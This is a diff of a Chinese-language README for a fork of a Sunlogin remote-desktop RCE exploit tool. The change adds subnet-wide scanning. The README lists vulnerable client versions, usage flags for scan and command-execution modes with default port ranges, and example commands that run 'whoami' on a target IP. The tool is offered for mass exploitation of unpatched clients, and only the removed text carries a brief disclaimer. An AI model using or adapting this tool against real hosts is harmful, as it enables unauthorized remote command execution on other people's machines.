@@ -1,34 +1,25 @@
-# 前言
-没啥好说的,直接放工具和有漏洞的版本吧,大家本地玩玩很不错，切勿用于非法测试。
+## Sunlogin RCE
+fork自https://github.com/Mr-xn/sunlogin_rce
+原项目只支持一个目的IP，做了修改，添加了IP段扫描功能
 
-测试向日葵客户端漏洞版本:11.0.0.33162
+## Usage
+```
+./xrkRce  -h <ip/subnet> [-t <scan | rce>] [-c <cmd>] [-p <port/ports] [-x <threadsCount>]
+    -h 单个IP或IP段,e.g. 10.0.0.1/24
+    -t 执行类型，scan为扫描，rce为执行命令。默认为scan
+    -c 指定要执行的命令，配合 "-t rce"使用
+    -p 指定端口/端口范围。默认为40000-65536
+    -x 指定协程数，默认为1000
+```
 
-漏洞客户端在源码中提供.
-
-端口扫描用的是:https://github.com/jboursiquot/portscan
-
-# 漏洞版本(根据反馈获得)
-11.1.1
-
-10.3.0.27372
-
-11.0.0.33162
-# 命令说明
--h 指定目标
-
--t 选择扫描或者命令执行  默认scan
-
--p 设置扫描端口范围 默认4w到65535
-
--c 需要执行的命令
-
-# 相关截图
-扫描
-![scan](scan.png "sacn")
+## Example & Screenshot
+scan
+```
+./xrkRce -h 192.168.0.100 -p 60000-65535
+```
+![scan](scan.png)
 rce
-![rce](exp.png "rce")
-
-# 时间
-20220216
-
-From https://github.com/TRYblog 
+```
+./xrkRce -h 192.168.0.100 -p 62944 -t rce -c "whoami"
+```
+![rce](rce.png)
